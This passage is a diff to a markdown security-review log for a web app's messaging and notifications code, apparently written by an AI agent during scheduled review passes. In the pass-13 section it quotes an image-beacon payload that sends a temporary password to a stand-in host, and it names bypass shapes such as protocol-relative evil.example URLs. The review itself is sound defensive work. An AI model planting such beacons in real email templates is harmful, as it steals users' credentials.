@@ -2,10 +2,12 @@
 
 **Prefix:** `MSG` · **Iteration:** 25 · **Reviewed:** 2026-08-26 (pass 1),
 2026-08-31 (pass 2), 2026-09-06 (pass 3), 2026-09-13 (pass 4), 2026-10-03
-(pass 5), 2026-10-07 (pass 6), 2026-10-17 (pass 7) · **PR:** #1907 (pass 1),
-pass 2 PR recorded in `PROGRESS.md`, #2305 (pass 3), pass 4 PR recorded in
-`PROGRESS.md`, pass 5 PR recorded in `PROGRESS.md`, #2984 (pass 6), pass 7
-(this PR)
+(pass 5), 2026-10-07 (pass 6), 2026-10-17 (pass 7), 2026-10-20 (pass 8),
+2026-10-24 (pass 9), 2026-10-27 (pass 10), 2026-10-30 (pass 11), 2026-11-03
+(pass 12) · **PR:** #1907 (pass 1), pass 2 PR recorded in `PROGRESS.md`,
+#2305 (pass 3), pass 4 PR recorded in `PROGRESS.md`, pass 5 PR recorded in
+`PROGRESS.md`, #2984 (pass 6), pass 7–11 PRs recorded in `PROGRESS.md`
+(pass 11: #3850), pass 12 (this PR)
 
 ## Pass 1 (2026-08-26)
 
@@ -2616,3 +2618,653 @@ One source file was changed by this pass: `app/utils/google_oauth.py`
 (MSG-17's fix, 10 lines). Every other behavioral delta since pass 9 was
 landed by other, non-rotation work and is reviewed/recorded, not authored,
 here.
+
+## Pass 11 (2026-10-30) — watchdog pickup, real delta (template on/off switch, generic-webhook dispatch), 0 fixed, 0 new findings
+
+Scheduled watchdog check-in (dedicated `/loop 30m /security-review` session
+`session_011T1ZyyLrD5HagusgK9uDw2` unreachable via `ListAgents`, "No
+reachable agents"). PR #3849 (Feature 24, Meetings & minutes, pass 11) had
+already merged (`52bb15d5`) before this iteration started;
+`search_pull_requests` (`head:claude/security-review-`) returned 0 open
+results both then and again right before this push. Row 25 (Messaging &
+notifications) confirmed the next `⬜` row in `PROGRESS.md`'s rotation table.
+
+Baseline: pass 10's merge, `02bdfb59` (PR #3768). `git log 02bdfb59..HEAD`
+against every file this feature's pass-1 scope declares surfaced **8**
+non-merge commits, all outside this rotation, all read in full (not cited
+from their own commit messages):
+
+- **Stop sending an email whose template is switched off** (`0a7e2a9e`) —
+  until now, switching a template Off in Communications → Email Templates
+  only made its sender fall back to the built-in default; the email kept
+  going out regardless. `EmailTemplateService.is_switched_off(org, type)`
+  now answers true only when the department has a stored row of that type
+  and none of them is active — read directly: a department that never
+  opened the screen has zero rows and `bool(states) and not any(states)`
+  is `False`, so every existing installation keeps sending exactly as
+  before until an admin explicitly switches something off (no silent
+  behavior change on upgrade, the Pitfall #19 shape handled correctly this
+  time). `ALWAYS_SENT_TYPES` (password reset, IT password notification,
+  welcome, ballot notification, application status link, plus the two
+  types two other commits below add to it) cannot be switched off:
+  `update_template` raises `ValueError` — correctly caught by the endpoint
+  and turned into a 400 via `safe_error_detail()`, not a 500 — before the
+  allowlisted-field `apply_updates` call ever runs, and the by-id lookup
+  backing it is `WHERE id = :template_id AND organization_id =
+:organization_id` (XC-3 — re-read at `email_template_service.py:3993-4008`,
+  unchanged). `EmailService._render_unless_switched_off` wraps all 16
+  template-backed `send_*` methods (re-counted, not trusted from the
+  commit message) and **fails open** on a lookup error — deliberate and
+  correctly scoped: the comment at `email_service.py` names the tradeoff
+  explicitly ("an email the department wants must not be lost to a lookup
+  error, and an unwanted one is a nuisance"), and a transient failure to
+  read one org's own on/off flag is not a tenant-isolation or
+  authentication control, so fail-open here does not fall under the
+  CLAUDE.md Attack Protection table's fail-closed list (CAPTCHA,
+  suspicious-IP block). Frontend (`51d23961`): the toggle now asks before
+  switching an email off (`useConfirm()` — not `window.confirm`, Pitfall
+  #16) and disables itself for an `always_sent` template with a tooltip
+  naming why, matching the backend's own refusal — client-side convenience
+  only, the 400 above is the actual control.
+- **Welcome email: load its template through the standard render path**
+  (`0466a78e`) — `send_welcome_email` used to load the Welcome template
+  itself just to read its stored attachments, bypassing
+  `_render_unless_switched_off`'s path (harmless in practice, since Welcome
+  is `ALWAYS_SENT_TYPES` and the old path never skipped it either, but a
+  second, divergent lookup path for one email type is exactly the shape
+  that drifts). Now goes through `_render_unless_switched_off` →
+  `_render_with_fallback` like every other sender; attachments travel out
+  through a new `attachments_out` list parameter, confined to
+  `self.organization` (re-read: the attachment query already filtered by
+  the template's own organization before this commit, unchanged).
+- **Add the Follow-up Form pipeline stage** (`27a363f1`) and **Add
+  follow-up form reminders, coordinator notice and answer display**
+  (`a36d27f1`) — Feature 08's (Membership pipeline) own feature, read here
+  only for the two new `EmailService` senders
+  (`send_follow_up_form_email`, `send_contact_changed_email`,
+  `send_follow_up_reminder_email`) and two new `EmailTemplateType`s they
+  add to this feature's shared registry. Traced every context value by
+  hand: `custom_message` (admin-typed) is the only one not carried through
+  the template engine's own `{{var}}` substitution, and it is
+  `_html.escape()`d into `custom_message_html` before being handed in —
+  the resulting pre-escaped string is then correctly listed in
+  `_RAW_HTML_VARIABLES` (`email_template_service.py:4614`) so the renderer
+  does not escape it a second time (which would show literal `&lt;p&gt;`
+  tags, a correctness bug, not a security one, had it been forgotten in
+  the other direction). `draft_note_html` (`a36d27f1`) is a hardcoded
+  constant, no user input, correctly listed in the same allowlist. Every
+  other context value (`first_name`, `applicant_name`, `form_name`,
+  `form_url`, `changed_details`) is **not** in the allowlist, so it gets
+  the template engine's default `html.escape()` — confirmed by reading
+  `_replace_variables` directly (`email_template_service.py:4629-4661`)
+  rather than trusting the docstring. `send_contact_changed_email` is
+  deliberately told only a changed-field label, never the new value
+  (per its own docstring, verified against its one caller in Feature 08's
+  service) — an old-address notice that echoed the new email/phone would
+  be a disclosure to whoever controls the old mailbox if it had been
+  taken over, which is exactly the scenario the email exists to warn
+  about.
+- **Email coordinators and applicants when an application goes stale**
+  (`1a9810fc`) — Feature 08's feature (an unread settings toggle finally
+  wired to a sender, the Pitfall #19 shape, already fixed correctly here);
+  read for its two new `EmailService` senders
+  (`send_inactivity_warning_email`, `send_application_going_inactive_email`).
+  Same pattern: every context value passes through the template engine's
+  default escaping, nothing added to `_RAW_HTML_VARIABLES`.
+- **Send four emails through the templates that describe them**
+  (`1ff282b9`) — Cert Expiration, Post-Event Validation, Post-Shift
+  Validation and Member Archived now render through
+  `EmailTemplateService.render_stored_or_default` (new) instead of
+  building their own strings; this feature's own file gained the method.
+  `render_stored_or_default(organization, ...)` resolves the template via
+  `get_template(str(organization.id), template_type)` — org-scoped,
+  re-read at the call site, unchanged shape from the pre-existing
+  `get_template`. No new escaping surface: it delegates to
+  `render_static`/`render_default`, which already go through
+  `_replace_variables`.
+- **Match emails by fingerprint and keep addresses out of new audit
+  entries** (`43c11090`) — a repo-wide sweep's share of this feature:
+  `message_history.py`'s search now matches a complete recipient address
+  through `email_fingerprints(search)` against a new
+  `MessageHistory.recipient_fingerprints` JSON column
+  (`func.json_contains(...) == 1`, OR'd onto the existing subject
+  `ilike`), rather than the old plaintext `to_email.ilike(...)`. Verified
+  by hand, not assumed: (1) **tenant isolation** — this OR clause is
+  appended to a query already filtered by
+  `MessageHistory.organization_id == current_user.organization_id` at
+  `list_message_history`'s very first `select()`
+  (`message_history.py:67-69`, unchanged), so it can only ever narrow
+  which of the caller's own org's rows match, never reach another org's;
+  (2) **correctness of the match, read for a security angle (does a
+  mismatch leak nothing, fail open, or scan the wrong rows?)** —
+  `_fingerprint_with` normalizes via `normalize_email()` (strip + lower)
+  _before_ hashing at both write time (`email_fingerprint`, used when a
+  `MessageHistory` row is created) and this read path
+  (`email_fingerprints`), so case/whitespace differences cannot cause a
+  false negative that would otherwise tempt a looser query later; (3) a
+  non-email search string fingerprints to a value that simply will not be
+  `json_contains`-equal to any stored fingerprint — `or_(false(), *())`
+  degrades to `false()` when `email_fingerprints(search)` returns `[]`
+  (empty/whitespace search), so the clause never silently becomes
+  "match everything." `email_fingerprints()` includes legacy-key
+  fingerprints (post key-rotation rows keep matching) — read, not
+  rotation-tested in this pass, since no rotation ran in this window.
+- **Integrations: Generic Webhooks are sent the events chat integrations
+  get** (`e392f355`) — the one commit touching this feature's declared
+  `integration_services/notification_dispatch.py` directly. New
+  `dispatch_generic_webhooks(db, organization_id, kind, payload)`:
+  queries `Integration` filtered on
+  `organization_id == str(organization_id)` **and**
+  `integration_type == "generic-webhook"` **and** `enabled.is_(True)`
+  (re-read, all three conditions present) — org-scoped, and the org id it
+  filters on is the caller's own (passed down from
+  `notify_entity_created`, itself called from request-scoped code with
+  the authenticated user's org, never client-supplied). The delivery URL
+  is the org's **own** previously-configured webhook endpoint
+  (`integration.get_secret("url")`), not external input reaching this
+  call fresh, and delivery goes through the pre-existing `send_webhook`
+  (`webhook_service.py`, outside this feature's declared scope but
+  checked here since it is the new call's whole reason for being safe),
+  which still calls `assert_outbound_url_safe(url)` immediately before
+  the HTTP request (confirmed at `webhook_service.py:98`, unchanged) —
+  the CHECKLIST §4 "stored outbound URLs are re-validated at send time"
+  item, already satisfied by code that predates this commit and is simply
+  invoked from a new call site. `logger.warning("Generic webhook delivery
+failed: {}", exc)` passes `exc` as a positional arg rather than
+  f-string-interpolating it into the message (Pitfall #33 — no
+  double-formatting hazard). Never raises past `notify_entity_created`
+  (wrapped in its own `try`/`except Exception`), so a broken webhook
+  cannot take down the chat-notification path running beside it.
+
+**0 new findings.** None of the eight commits add a route, change a
+permission string on this feature's own four endpoint files (confirmed
+by the AST re-enumeration below), or touch SMS send logic directly.
+
+### Re-swept, unchanged since pass 10
+
+- `grep -rn "SMSService("` across `backend/app`: still exactly the two
+  gated call sites (`notification_channels.py` — the allowlist resolver
+  itself; `message_delivery_service.py:582` — re-read in full, confirmed
+  its `targets` list is built by `resolve_sms_targets(self.db, recipients,
+SmsAlert.URGENT_DEPARTMENT_MESSAGE)` a few lines above the send, not a
+  bypass).
+- `.ilike(`/`.like(` sites in this feature's scope
+  (`message_history.py:85`, `messaging_service.py:245-246`,
+  `notifications_service.py:91-92`): unchanged, still pass
+  `escape=LIKE_ESCAPE_CHAR` with a `like_pattern()`-built pattern (the one
+  new comparison this pass reviewed, the fingerprint `json_contains` OR
+  clause, is not a `LIKE` and needs no escaping — it is an exact-match
+  equality check against a hash).
+- CSV export: still none in this feature's scope.
+
+### Standing findings — re-confirmed open/unchanged
+
+- **MSG-3** — `POST /message-history/test-email` (still present,
+  `message_history.py:123`) sends to an admin-typed `to_email`, by design.
+  Unchanged.
+- **MAIL-4** — `POST /email-templates/schedule` (still present,
+  `email_templates.py:943`) `to/cc/bcc_emails` accept arbitrary addresses,
+  by design, same trust boundary as MSG-3. Unchanged.
+- **`email_service.py`'s F4** — no SSRF-style validation on an
+  org-configured SMTP host, a deliberate policy decision. Unchanged.
+- **`NotificationRuleCreate`/`Update.config` unbounded-JSON note** —
+  informational, low severity, unchanged.
+
+### Route inventory — re-enumerated by AST, 51 routes (unchanged since pass 5)
+
+Walked all four endpoint files' decorators by AST rather than trusting the
+prior count: 13 (`messages.py`) + 2 (`message_history.py`) + 20
+(`notifications.py`) + 16 (`email_templates.py`) = **51**, matching pass 10
+exactly. No new route in this feature's four declared endpoint files.
+
+### Frontend — four commits since pass 10, three reviewed above or trivial
+
+- `51d23961` (Template editor confirm-before-off, `always_sent` disabled
+  state) — reviewed above alongside the backend switch-off work.
+- `9af732d9` (`alert-error` → `alert-danger` CSS class fix in two
+  Communications components) — pure styling, no security surface.
+- `a36d27f1`/`27a363f1` also touch
+  `frontend/src/services/communicationsServices.ts`/related files as part
+  of Feature 08's own frontend; no separate finding beyond the backend
+  review above.
+- `4e6c1c81` (training compliance matrix member-class filter) matched this
+  feature's frontend scope glob only because it touches
+  `communicationsServices.ts` incidentally (a shared service file); the
+  actual change is Feature 17's training compliance matrix and carries no
+  messaging/notification surface.
+
+### Schema & migration notes
+
+No migration landed in this feature's own declared scope this pass (the
+fingerprint/encryption migrations were authored and reviewed under the
+repo-wide encryption sweep, outside this rotation's authorship). See the
+completion gate below for the current revision count and head.
+
+## Guard tests added (pass 11)
+
+None — every reviewed commit's own test suite (listed in each bullet
+above, e.g. `EmailTemplatesPage.switch.test.tsx`, the cert/post-event/
+post-shift/member-archive test updates) already covers its change, and
+this pass found no new finding requiring its own guard test.
+
+## Completion gate (pass 11)
+
+**Note (pass 12):** this section was found empty — the pass-11 commit
+(`9483ab8a6`) ended the file right after this header, with no gate table
+ever written. A documentation gap in a merged pass, not a security finding;
+noted here rather than silently filled in after the fact, since a reader
+should be able to tell this gap was never run down. Pass 12's own gate below
+is complete.
+
+## Pass 12 (2026-11-03) — watchdog pickup, real delta (web push dispatch queue + click-URL validation, History module notices, five new email senders), 0 fixed, 0 new findings
+
+Scheduled watchdog check-in — the dedicated `/loop 30m /security-review`
+session (`session_011T1ZyyLrD5HagusgK9uDw2`) was unreachable (`ListAgents`:
+no reachable agents). Step 0: a GitHub search for `is:pr is:open
+head:claude/security-review` returned 0 results — PR #3978 (Feature 24,
+Meetings & minutes, pass 12) had already merged (`7127d632f`). Row 25
+(Messaging & notifications) confirmed the next `⬜` row in `PROGRESS.md`'s
+rotation table.
+
+**Baseline:** `9483ab8a6` (pass 11's own content commit, merged via PR #3850
+at `957aa6301`). **Head:** `7127d632f`. `git log --no-merges
+9483ab8a6..HEAD` restricted to this feature's four endpoint files, its
+service/model files, `frontend/src/modules/communications`,
+`NotificationsPage.tsx` and `usePushNotifications.ts` surfaced 13 non-merge
+commits with a real diff against this feature's own files (the broader
+range also touches ~30 other commits — Evaluations 1–5, the History module,
+Zeffy, minutes concurrency, etc. — reviewed only insofar as they add a new
+call into this feature's shared senders).
+
+### Reviewed in full
+
+- **`5dac39fe6` "Fix four faults in the web push flow"** — the substantial
+  change this pass. Four fixes, all read against the real diff rather than
+  the commit message:
+  1. **Shared-device notification leakage, closed on the frontend.** A push
+     subscription belongs to the browser, not the signed-in member, so a
+     station computer kept delivering the previous member's pushes after
+     sign-out. `claimDeviceForMember` (`authStore.ts:183-209`, pre-existing
+     for drafts/offline-queue ownership) now also calls
+     `releaseDevicePushSubscription()` from the new
+     `utils/devicePushSubscription.ts` on every sign-in where the device's
+     recorded owner changes — unsubscribing in the browser revokes the
+     endpoint, and the next send gets a 404/410 that
+     `PushService.send_to_user` already pruned on (pre-existing, unchanged).
+     The new member re-subscribes on their own permission grant; nothing
+     server-side hands a subscription to a different user. Deliberately
+     scoped to sign-_in_, not sign-out, per its own comment — a member
+     signing out of their own device keeps push until someone else signs in
+     on it, which is the same boundary already used for the offline queue.
+  2. **A department-wide announcement no longer holds the request open per
+     recipient.** `NotificationsService._maybe_push` (unchanged logic, now
+     calling the new `push_dispatch.schedule_push` instead of sending
+     in-line) queues the push and returns at once;
+     `backend/app/services/push_dispatch.py` (new, 154 lines) drains the
+     queue with 4 workers, each opening its own `async_session_factory()`
+     session — the request's own session is already closed by the time a
+     worker runs, so this is correctly isolated. **Pitfall #9 compliance,
+     read directly rather than trusted from the comment:** `_MAX_QUEUED_PUSHES
+= 5_000` is checked with a plain length comparison before enqueueing
+     (`schedule_push`, line 107), and a full queue drops the push and logs a
+     warning rather than blocking or growing further — the in-app
+     notification and email it accompanies are already durably committed by
+     that point, so a dropped push loses nothing but the phone buzz.
+     Dispatchers are kept in a `WeakKeyDictionary` keyed by event loop
+     (`weakref.WeakKeyDictionary`, line 79-81) rather than a module global,
+     so a test's or worker's loop teardown lets its dispatcher and queue be
+     collected — this is itself a second, independent bound on growth, not
+     just the 5,000 cap. The worker-counting comment at line 118-121 (count
+     by `.done()`, not by set membership, to avoid a push finding the set
+     "full" of workers that already finished but whose done-callback has not
+     yet run) is a real race the code visibly accounts for, not decoration.
+  3. **An open redirect on notification tap, closed defensively.** New
+     `_click_path()` (`push_service.py:225-239`) rejects anything that is
+     not a same-site path — no scheme, no `//host` or `/\host` (the
+     backslash form some browsers also read as a protocol-relative URL) —
+     and falls back to the inbox. `NotificationLog.action_url` is a stored
+     column fed from roughly 60 call sites across the backend
+     (`grep -rn "action_url" backend/app/services/`, sampled across a dozen
+     files); every one of them builds a server-side relative path
+     (`f"/events/{event.id}"`, hardcoded constants, etc.) — none echoes
+     client text directly into this field today — so this is accurately
+     scoped as defense-in-depth for a future caller, not a fix for a live
+     exploit. `url: Optional[str] = None` (was a hardcoded default) plus the
+     fallback inside `_click_path` means an absent `action_url` still opens
+     the inbox exactly as before.
+  4. A done()-counting race and a shutdown spin in `push_dispatch.py`
+     (`wait_for_queued_pushes`'s `drained()` loop, guarded by excluding
+     already-`done()` workers from the `gather` so a fully-finished set
+     doesn't spin without yielding) — correctness/availability, not a
+     security defect, confirmed by reading the comment against the code.
+     All four are guarded by the commit's own tests
+     (`test_push_dispatch.py` — the done-counting race and shutdown spin,
+     `usePushNotifications.test.ts`, the new `devicePushSubscription.test.ts`),
+     run below.
+- **`e15517759` "Add the History module"** — not this feature's own scope
+  (no row in `PROGRESS.md`'s rotation table yet exists for History), but its
+  new `backend/app/services/history_notifications.py` (201 lines, read in
+  full) is a new call into this feature's shared `NotificationLog`/email
+  plumbing and so is reviewed here as a new sender, the same way pass 11
+  reviewed Feature 08's new senders:
+  - **Tenant isolation.** `send_history_notice(organization_id, user_ids,
+notice)` re-filters the caller-supplied `user_ids` through
+    `select(User).where(User.id.in_(user_ids), User.organization_id ==
+str(organization_id), User.is_active)` (lines 121-127) before sending
+    anything — even though every call site's `org_id`/`user_ids` already
+    trace back to `current_user.organization_id` and server-computed
+    recipient lists (`service.administrators(org_id)`,
+    `outcome.notify_next`/`notify_submitter` — read at
+    `api/v1/endpoints/history.py:811-924`, none client-supplied), this is a
+    second, independent org filter rather than trusting the caller.
+  - **Injection.** `record_label` and `actor_name` (admin-controlled display
+    names, not raw client text, but still escaped on principle) are
+    `html.escape()`d before going into `body_html`
+    (`awaiting_clearance_notice`, `clearance_outcome_notice`,
+    `clearance_list_changed_notice`). The email `subject` goes through
+    `_subject_safe()` — `" ".join(text.split())[:200]` — which collapses
+    _all_ whitespace including `\r`/`\n` before truncating, closing an
+    email-header-injection path (a label containing a newline cannot smuggle
+    a second header) as a side effect of what reads like a cosmetic
+    normalizer.
+  - **Data exposure.** The notice "carries none of the record's content, so
+    a draft biography or a burial location never sits in a mailbox" (its own
+    docstring, verified against the code: `_notice()` only ever receives a
+    record label and a path, never the record body).
+  - **Observation, not a finding:** `_record_in_app` builds its
+    `NotificationLog` row directly (`session.add(NotificationLog(...))`,
+    line 147-159) rather than going through
+    `NotificationsService.log_notification`, so History's in-app notices do
+    not reach `_maybe_push` and are never web-pushed. A completeness gap
+    (Pitfall #19's shape, in reverse — a notice silently missing a channel,
+    not a security exposure), left for History's own future review rather
+    than fixed here, since wiring it in is a one-line, in-scope-for-History
+    change this pass has no mandate to make.
+- **Five new `EmailService` senders** across the Evaluations (`c45f5d8b5`,
+  `92ec254c3`, `5485f5fa8`) and membership-pipeline commits —
+  `send_applicant_assigned_email`, `send_applicant_needs_attention_email`,
+  `send_evaluation_notice` (shared across four evaluation notice types) plus
+  two inactivity-warning senders reviewed for their email-sending shape only
+  (their business logic is Features 08/17's own). Diffed
+  `email_service.py`, `email_template_service.py` and
+  `email_templates_evaluations.py` (new, grown to 291 lines) against
+  `_RAW_HTML_VARIABLES`: **zero new entries** — every new sender's context
+  dict goes through `_render_unless_switched_off` →
+  `_replace_variables`'s default `html.escape()` path, the same discipline
+  pass 11 verified for Feature 08's senders. The evaluation "written
+  response" notice (`RESPONSE_SUBJECT`/`RESPONSE_HTML` in
+  `email_templates_evaluations.py`) deliberately never includes the
+  response text itself — "The response is with the evaluation in the
+  Logbook and on its PDF" — the same content-minimization pattern as pass
+  11's `send_contact_changed_email`.
+- **`7f0ef2c1d`** (minutes action-item overdue-by-local-day fix) — `+6` in
+  `notifications.py`, `+9` in `notifications_service.py`: adds a `failed:
+bool = False` query param to `GET /logs` (not a new route) and a matching
+  `failed_only` filter in `NotificationsService.get_logs`. Read the full
+  method (`notifications_service.py:212-266`): the `organization_id` filter
+  is applied first (line 244-246, unchanged), `failed_only` and
+  `recipient_id` narrow it further — the new predicate cannot widen what a
+  caller already could not see. `_resolve_log_scope` (unchanged) still gates
+  the org-wide scope on `notifications.manage`.
+
+### Re-swept, unchanged since pass 11
+
+- Route count: **51**, re-enumerated by walking all four endpoint files'
+  decorators by AST (13 + 2 + 20 + 16), matching pass 11 exactly. No new
+  route added to this feature's own four endpoint files — the query-param
+  addition above is the only change to an existing one.
+- `SMSService(` call sites: still exactly `notification_channels.py` (the
+  allowlist resolver) and `message_delivery_service.py:582` (its `targets`
+  built via `resolve_sms_targets(..., SmsAlert.URGENT_DEPARTMENT_MESSAGE)`
+  immediately above the send).
+- `.ilike(`/`.like(` sites (`message_history.py:85`,
+  `messaging_service.py:245-246`, `notifications_service.py:91-92`):
+  unchanged, all still pass `escape=LIKE_ESCAPE_CHAR` with a
+  `like_pattern()`-built pattern.
+- CSV export: still none in this feature's scope.
+- Standing findings MSG-3, MAIL-4, `email_service.py`'s F4, and the
+  `NotificationRuleCreate`/`Update.config` unbounded-JSON note: all
+  unchanged, deliberate, by-design trust boundaries — none touched by this
+  delta.
+- `push_service.py`'s subscribe/unsubscribe endpoints and 404/410 pruning on
+  send: unchanged by this delta (confirmed via diff — only `_click_path` and
+  the `url` default were touched), not re-reviewed line-by-line since pass
+  10 already covers them and nothing here calls them differently.
+
+**0 new findings.** No route gained or lost a permission; no by-id query
+lost its organization filter; no new sender bypasses the template engine's
+default escaping; the one genuinely new unbounded-growth surface
+(`push_dispatch`'s queue) ships with the Pitfall #9 cap already in place.
+
+## Guard tests added (pass 12)
+
+None — every reviewed change ships with its own test (`test_push_dispatch.py`,
+`usePushNotifications.test.ts`, `devicePushSubscription.test.ts`, the
+Evaluations/History modules' own suites), and this pass found no new finding
+requiring its own guard test.
+
+## Completion gate (pass 12)
+
+| Check                                                                                                                                 | Result                                                      |
+| ------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
+| `flake8 app/ tests/ alembic/`                                                                                                         | ✅ clean                                                    |
+| `black --check app/ tests/ alembic/`                                                                                                  | ✅ clean (2,869 files unchanged)                            |
+| `isort --check-only app/ tests/ alembic/`                                                                                             | ✅ clean                                                    |
+| `python3 scripts/validate_migrations.py --strict`                                                                                     | ✅ 710 revisions, single head `6b81e95d4157`                |
+| `python3 scripts/check_route_permissions.py --strict`                                                                                 | ✅ 298 routes, 0 errors/warnings                            |
+| `pytest tests/ -q -k "notification or messag or push_dispatch or push_service or history_notif or email_template"` (via `python3.13`) | ✅ 1,371 passed, 1 pre-existing skip (`pywebpush` optional) |
+| `npm run typecheck`                                                                                                                   | ✅ 0 errors                                                 |
+| `npm run lint`                                                                                                                        | ✅ 0 errors/warnings                                        |
+| `npx vitest run src/modules/communications src/hooks/usePushNotifications.test.ts src/pages/NotificationsPage.failedFilter.test.tsx`  | ✅ 287 passed (40 files)                                    |
+
+Next in rotation: Feature 26 (Forms).
+
+---
+
+## Pass 13 (2026-11-11) — watchdog pickup, real delta (credential-template link policy, member email policy/opt-outs, a new screening-reminder sender), 0 fixed, 0 new findings
+
+Scheduled watchdog check-in — the dedicated `/loop 30m /security-review`
+session (`session_011T1ZyyLrD5HagusgK9uDw2`) remained unreachable
+(`ListAgents`: no reachable agents). Step 0: `list_pull_requests` (state
+`open`) found no PR with a `claude/security-review-*` head — PR #4232
+(Feature 24, Meetings & minutes, pass 13) had just merged clean
+(`47d68bce90d`, 26/26 CI checks green, no conflicts, no open review
+threads). Row 25 (Messaging & notifications) confirmed the next `⬜` row in
+`PROGRESS.md`'s rotation table.
+
+**Baseline:** `9483ab8a6` → **pass-12 head:** `7127d632f` (PR #3980, merged).
+**This pass's head:** `47d68bce9`. `git log --no-merges 7127d632f..HEAD`
+restricted to this feature's backend files, `frontend/src/modules/
+communications`, `frontend/src/modules/notifications`,
+`NotificationsPage.tsx`, `usePushNotifications.ts`,
+`devicePushSubscription.ts` and `communicationsServices.ts` surfaced 11 real
+commits plus one git-history artifact (`a87067dfe`, an orphan root commit
+with no parent that this repository's history grafts in — its diff against
+`/dev/null` makes every file it touches look wholly new, but a direct
+`git diff 7127d632f HEAD` on the one file it appeared to add 467 lines to
+showed a 2-line real change, confirming it is noise, not content; noted here
+so a future pass does not re-investigate it from scratch).
+
+### Reviewed in full
+
+- **`20749935b` + `ca89f7492` "Protect credential email templates from being
+  rewritten to leak" / "Close two gaps in the credential-template link
+  policy"** — the substantial change this pass. `settings.manage` (held by
+  the Secretary) could previously rewrite the welcome/reset/ballot/
+  applicant-link email templates — each of which carries a temporary
+  password or a token — to add `<img src="https://elsewhere/?p=
+{{temp_password}}">` and exfiltrate credentials from the department's own
+  sender, with no audit trail. Read both commits against the real diff, not
+  the message:
+  - **Permission + step-up, verified at the single call site.**
+    `update_email_template` (`email_templates.py:663`) loads the existing row
+    org-scoped first (`_load_template_for_write`), checks
+    `is_always_sent(existing.template_type)`, and for a protected type
+    requires `user_has_permission(current_user, "*")` (403 otherwise) plus
+    `ensure_stepup()` before any write proceeds. `grep -rn
+"\.update_template(" backend/app` confirms `EmailTemplateService
+.update_template` has exactly one caller in `app/` (this endpoint,
+    line 703) — the HTML-link validation added to the service method itself
+    is therefore not bypassable through any other route; there is also no
+    `POST /` create endpoint for templates (only `PUT`/`reset`), so a
+    protected type cannot be created fresh with unvalidated content either.
+  - **The link policy itself.** `protected_template_link_problems()`
+    (`email_template_service.py`) walks the HTML with a stdlib
+    `HTMLParser` subclass checking every URL-bearing attribute (`href`,
+    `src`, `srcset`, `background`, `action`, `formaction`, `poster`, `data`,
+    `xlink:href`, `cite`, `longdesc`, `lowsrc`, `dynsrc`, `ping` — including
+    `<base href>`, since `href` is in the set regardless of tag) plus
+    `<style>` blocks and `style=` attributes, allowing only the app's own
+    host (`FRONTEND_URL`), a lone `{{placeholder}}`, `mailto:`/`tel:`, and
+    in-page anchors. Traced several bypass shapes by hand rather than
+    trusting the allowlist description: a protocol-relative `//evil.example/x`
+    has `urlsplit().scheme == ''`, which fails the `scheme in ("http",
+"https")` check and falls through to `return False` (refused) for both
+    HTML attributes and CSS — not just inside `url()`, since `ca89f7492`
+    added `_CSS_ABSOLUTE_URL` to catch a bare quoted string in `image-set()`
+    and a CSS-escape backslash (`u\72l(`) is refused outright, since no regex
+    can follow an escaped function name. `handle_comment` recurses the same
+    collector into `<!--[if mso]>...<![endif]-->` bodies, since Outlook
+    renders those as markup — verified the shipped templates' own
+    conditionals (bare table wrappers) still pass.
+  - **Audit trail.** Every update and reset now writes an audit row
+    (`_audit_template_change`) with a unified diff of changed body fields
+    plus SHA-256 fingerprints (so a change is provable even if the diff is
+    truncated at 4000 chars) and `severity="warning"` specifically for
+    protected types, vs. `"info"` for ordinary ones.
+  - **Test coverage read directly, not assumed from the file's existence:**
+    `test_email_template_credential_protection.py` covers all of the above —
+    every shipped `ALWAYS_SENT_TYPES` default passes the policy
+    (parametrized), a beacon payload is refused, an own-host placeholder
+    substitution is refused, CSS fetches/srcset/mso-comments/CSS-escapes are
+    each caught with their own case, `settings.manage` is 403'd on a
+    protected type, a full admin without step-up is blocked, a full admin
+    _with_ step-up still cannot save a beacon (400, not merely 403), and an
+    allowed edit's audit row is asserted to carry a real diff with changed
+    hashes. Ordinary templates are confirmed to keep the old
+    `settings.manage`-only, link-anywhere behavior. One residual
+    low-confidence gap noted for awareness, not fixed or flagged as a
+    product decision: a `<meta http-equiv="refresh" content="0;url=...">`
+    redirect is not in `_URL_ATTRIBUTES` (it is a tag's own text content,
+    not an attribute value), but major email clients (Gmail, Outlook, Apple
+    Mail) strip `<meta>` tags from rendered HTML email bodies as a matter of
+    their own sanitization, so this is not a reproducible exploit against
+    this feature's actual delivery path — recorded here rather than
+    silently skipped.
+- **`26b2e202d` "...Communications & Integrations: build the owner's
+  2026-11-01 decisions (batch 8)"** — three new routes in
+  `email_templates.py` (`GET`/`PUT /member-email-policy`,
+  `GET /member-email-opt-outs`) and the matching
+  `MemberEmailOptOutsPage.tsx`/`routes.tsx` frontend. All three gated
+  identically to the existing `/communications/member-emails` page
+  (`settings.manage`, `organization.update_settings` or
+  `notifications.manage`, matching front-to-back). `list_member_email_opt_outs`
+  derives `org_id` from `current_user.organization_id` and filters every
+  query by it; the roster read is deliberately in-Python (one department's
+  worth of members, per the 2026-11-01 one-department-per-install decision,
+  the same shape `get_message_stats`'s org already uses elsewhere in this
+  feature). `update_member_email_policy` mutates `Organization.settings`
+  via `copy.deepcopy()` before reassignment (CLAUDE.md Pitfall #12 — a
+  shallow `dict()` here would silently no-op the write).
+- **`3e478316d`'s messaging-scoped slice (medical screening expiry
+  reminders)** — a new sender into this feature's shared plumbing, reviewed
+  the same way pass 11/12 reviewed other features' new senders. The trigger
+  is correctly wired into _both_ registries Pitfall #19 requires:
+  `NotificationTrigger.MEDICAL_SCREENING_EXPIRY` is in `ENFORCED_TRIGGERS`
+  (`models/notification.py:74`) and has a `_DEFAULT_CONFIG` entry
+  (`notification_rules.py:57`) — absence of a rule means on, matching the
+  owner's decision that reminders exist by default, not silently off.
+  `ScreeningReminderService` (`screening_reminder_service.py`, 291 lines,
+  read in full): every interpolated value in the email body
+  (`greeting`, `requirement_name`, `link`) goes through `html.escape()`;
+  the idempotency key is `(screening_record_id, tier_days, due_date)`,
+  unique on `screening_reminder_sends`, claimed by committing the row
+  _before_ the send (an "at least once" shape the module's own docstring
+  states is deliberate for a reminder, where a duplicate is a nuisance and
+  a silent miss is a lapsed screening — the opposite tradeoff from the
+  payment-shaped "stamp then send" rule in CLAUDE.md Pitfall #36, correctly
+  chosen for this content); a failed send calls `_release()` to roll the
+  claim back so tomorrow's run retries. No SMS, no bell/`notification_logs`
+  entry — the module's own docstring explains why: a bell entry would store
+  the requirement name in plaintext, undoing MS-18's encryption of
